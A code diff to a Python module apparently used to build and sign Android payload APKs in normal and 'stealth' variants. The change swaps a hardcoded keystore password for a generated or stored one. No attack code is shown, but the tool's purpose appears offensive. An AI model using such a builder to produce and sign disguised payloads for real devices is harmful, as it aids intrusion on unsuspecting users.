@@ -6,6 +6,8 @@ Payload Builder Module
 import os
 import subprocess
 import shutil
+import secrets
+import string
 from colorama import Fore, Style
 
 class PayloadBuilder:
@@ -33,13 +35,45 @@ class PayloadBuilder:
         print(f"  → {self.payload_name}_final.apk (Normal)")
         print(f"  → {self.payload_name}_stealth_final.apk (Stealth)")
         
+
+    def _get_keystore_password(self):
+        """Get or generate a secure keystore password."""
+        # 1. Check environment variable
+        env_pass = os.environ.get("ANDROID_KEYSTORE_PASS")
+        if env_pass:
+            return env_pass
+
+        # 2. Check for existing password file
+        pass_file = ".keystore_pass"
+        if os.path.exists(pass_file):
+            try:
+                with open(pass_file, "r") as f:
+                    return f.read().strip()
+            except Exception:
+                pass
+
+        # 3. Generate new secure password
+        alphabet = string.ascii_letters + string.digits
+        new_pass = ''.join(secrets.choice(alphabet) for i in range(16))
+
+        # Save it securely
+        try:
+            fd = os.open(pass_file, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
+            with os.fdopen(fd, "w") as f:
+                f.write(new_pass)
+        except Exception as e:
+            print(f"{Fore.RED}  ✗ Warning: Could not save keystore password: {e}{Fore.WHITE}")
+
+        return new_pass
+
     def create_keystore(self):
         """Create debug keystore"""
         print(f"{Fore.YELLOW}[+] Creating keystore...{Fore.WHITE}")
+        password = self._get_keystore_password()
         subprocess.run([
             "keytool", "-genkey", "-v", "-keystore", "debug.keystore",
             "-alias", "androiddebugkey", "-keyalg", "RSA", "-keysize", "2048",
-            "-validity", "10000", "-storepass", "android", "-keypass", "android",
+            "-validity", "10000", "-storepass", password, "-keypass", password,
             "-dname", "CN=Android Debug, O=Android, C=US"
         ], capture_output=True)
         
@@ -85,13 +119,15 @@ class PayloadBuilder:
         final_name = f"{name}_final.apk"
         aligned = f"{name}_aligned.apk"
         
+        password = self._get_keystore_password()
+
         # Align APK
         subprocess.run(["zipalign", "-v", "4", apk_file, aligned], capture_output=True)
         
         # Sign APK
         subprocess.run([
             "apksigner", "sign", "--ks", "debug.keystore",
-            "--ks-pass", "pass:android", "--key-pass", "pass:android",
+            "--ks-pass", f"pass:{password}", "--key-pass", f"pass:{password}",
             "--out", final_name, aligned
         ], capture_output=True)
         
@@ -105,8 +141,8 @@ class PayloadBuilder:
             # Fallback to jarsigner
             subprocess.run([
                 "jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1",
-                "-keystore", "debug.keystore", "-storepass", "android",
-                "-keypass", "android", apk_file, "androiddebugkey"
+                "-keystore", "debug.keystore", "-storepass", password,
+                "-keypass", password, apk_file, "androiddebugkey"
             ], capture_output=True)
             shutil.copy(apk_file, final_name)
             print(f"{Fore.GREEN}  ✓ Signed (fallback): {final_name}{Fore.WHITE}")
